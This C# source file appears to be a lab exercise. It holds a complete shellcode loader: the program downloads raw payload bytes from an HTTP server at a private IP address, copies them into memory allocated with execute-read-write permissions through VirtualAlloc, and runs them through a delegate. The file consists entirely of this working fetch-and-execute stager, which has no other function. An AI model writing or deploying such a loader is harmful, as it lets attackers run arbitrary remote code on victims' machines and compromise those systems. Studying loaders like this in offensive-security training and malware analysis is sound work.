using System.Runtime.InteropServices;

namespace Lab2_1
{
    internal class Program
    {
        [DllImport("Kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            int dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("Kernel32.dll")]
        private static extern bool VirtualFree(
            IntPtr lpAddress,
            int dwSize,
            UInt32 dwFreeType
        );

        private static UInt32 MEM_COMMIT = 0x00001000;
        private static UInt32 MEM_RESERVE = 0x00002000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_DECOMMIT = 0x00004000;

        // create a delegate for the shellcode function written to memory
        public delegate void RunShellcodeDelegate();

        public static async Task Main(string[] args)
        {
            await DownloadAndInjectShellcode("http://192.168.254.104:8000/payload_bytes_only.bytes");
        }

        private static async Task DownloadAndInjectShellcode(string url)
        {
            Uri uri = new Uri(url);
            using (HttpClient client = new HttpClient())
            {
                // fetch the payload bytes
                HttpResponseMessage response = await client.GetAsync(uri);

                // store them in a byte array
                byte[] payload = await response.Content.ReadAsByteArrayAsync();

                // allocate a memory region in this process for the payload
                IntPtr startingPtr = VirtualAlloc(IntPtr.Zero, payload.Length, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                // copy the payload into the allocated memory region
                Marshal.Copy(payload, 0, startingPtr, payload.Length);

                // get the delegate (managed) from the function pointer (unmanaged) and then run it
                // the function pointed to already has a body (the injected shellcode)
                RunShellcodeDelegate shellcodeDelegate = (RunShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(startingPtr, typeof(RunShellcodeDelegate));
                shellcodeDelegate();

                // good manners, free up allocated memory when done
                VirtualFree(startingPtr, payload.Length, MEM_DECOMMIT);
            }
        }
    }
}
